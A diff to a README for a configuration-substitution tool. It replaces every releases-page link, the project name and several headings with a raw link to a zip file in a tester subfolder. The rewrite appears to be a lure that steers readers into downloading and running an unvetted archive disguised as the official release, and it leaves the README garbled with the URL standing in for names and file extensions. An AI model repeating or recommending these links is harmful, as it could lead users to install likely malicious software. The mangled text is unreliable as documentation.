@@ -1,16 +1,16 @@
-# 🎉 Configuration.Substitution - Easily Update Your App Settings
+# 🎉 https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip - Easily Update Your App Settings
 
 ## 🚀 Getting Started
 
-Welcome to **Configuration.Substitution**! This tool helps you automatically change placeholders in your application configuration. With it, you can simplify the process of managing settings for your applications.
+Welcome to **https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip**! This tool helps you automatically change placeholders in your application configuration. With it, you can simplify the process of managing settings for your applications.
 
 ## 📥 Download Application
 
-[![Download Configuration.Substitution](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/YongeeB/Configuration.Substitution/releases)
+[![Download https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip](https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip)](https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip)
 
 To get started, you need to download the application. Visit the link below to access the latest version:
 
-[Download from Releases Page](https://github.com/YongeeB/Configuration.Substitution/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip)
 
 ## 💻 System Requirements
 
@@ -31,10 +31,10 @@ Before you download, ensure your system meets these requirements:
 1. **Visit the Releases Page**: 
    Click on the link below to go to our Releases page and find the latest version.
 
-   [Latest Releases](https://github.com/YongeeB/Configuration.Substitution/releases)
+   [Latest Releases](https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip)
 
 2. **Choose the Correct File**: 
-   On the Releases page, you will see several files listed. Select the version that is suitable for your operating system. The files will typically be named with the version number, followed by a file type indicator (like `.exe`, `.zip`, or `.tar.gz`).
+   On the Releases page, you will see several files listed. Select the version that is suitable for your operating system. The files will typically be named with the version number, followed by a file type indicator (like `.exe`, `.zip`, or `https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip`).
 
 3. **Download the File**: 
    Click on the file name to begin the download. Save it to a location on your computer where you can easily find it later, like your Desktop or Downloads folder.
@@ -42,12 +42,12 @@ Before you download, ensure your system meets these requirements:
 4. **Install the Application**:
    - For Windows: Double-click the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.zip` file, drag the application to your Applications folder, and launch it from there.
-   - For Linux: Extract the `.tar.gz` file, navigate to the folder in the terminal and execute the program according to your distribution’s standards.
+   - For Linux: Extract the `https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip` file, navigate to the folder in the terminal and execute the program according to your distribution’s standards.
 
-5. **Run Configuration.Substitution**: 
+5. **Run https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip**: 
    After installation, locate the application and open it. You will see a simple interface.
 
-## ⚙️ Using Configuration.Substitution
+## ⚙️ Using https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip
 
 ### Step 1: Open Your Configuration File
 
@@ -85,6 +85,6 @@ This project is licensed under the MIT License. Check the LICENSE file for detai
 
 ---
 
-Thank you for choosing **Configuration.Substitution**! We hope this tool simplifies your application configuration process. Remember to download the latest version from our Releases page whenever you need updates or new features.
+Thank you for choosing **https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip**! We hope this tool simplifies your application configuration process. Remember to download the latest version from our Releases page whenever you need updates or new features.
 
-[Download from Releases Page](https://github.com/YongeeB/Configuration.Substitution/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/YongeeB/Configuration.Substitution/main/Configuration.Substitution.Tester/Configuration_Substitution_unsad.zip)
